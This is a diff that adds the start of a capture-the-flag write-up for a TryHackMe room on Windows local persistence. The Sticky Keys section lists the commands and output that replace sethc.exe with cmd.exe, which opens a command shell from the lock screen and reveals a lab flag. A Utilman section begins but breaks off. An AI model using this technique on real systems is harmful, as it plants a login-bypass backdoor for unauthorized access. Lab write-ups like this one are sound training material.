@@ -1,1 +1,43 @@
+# About This Module
+Module link: https://tryhackme.com/room/windowslocalpersistence
 
+**Please feel free to point out any errors that you may see in this writeup!**
+
+This writeup was last updated: 07/06/2023
+
+# Stickey Keys
+1. Started this room's machine
+2. `takeown /f c:\Windows\System32\sethc.exe`
+```PowerShell
+C:\Users\Administrator>takeown /f c:\Windows\System32\sethc.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "WPERSISTENCE\Administrator".
+```
+3. `icacls C:\Windows\System32\sethc.exe /grant Administrator:F`
+```PowerShell
+C:\Users\Administrator>icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+processed file: C:\Windows\System32\sethc.exe
+Successfully processed 1 files; Failed processing 0 files
+```
+4. `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`
+```PowerShell
+C:\Users\Administrator>copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): Yes
+        1 file(s) copied.
+```
+5. Lock you screen and press **SHIFT** five times
+
+![]()
+
+![]()
+
+![]() 
+
+6. `C:\flags\flag14.exe`
+```PowerShell
+C:\Windows\system32>C:\flags\flag14.exe
+THM{BREAKING_THROUGH_LOGIN}
+```
+
+# Utilman
+1. Started this room's machine
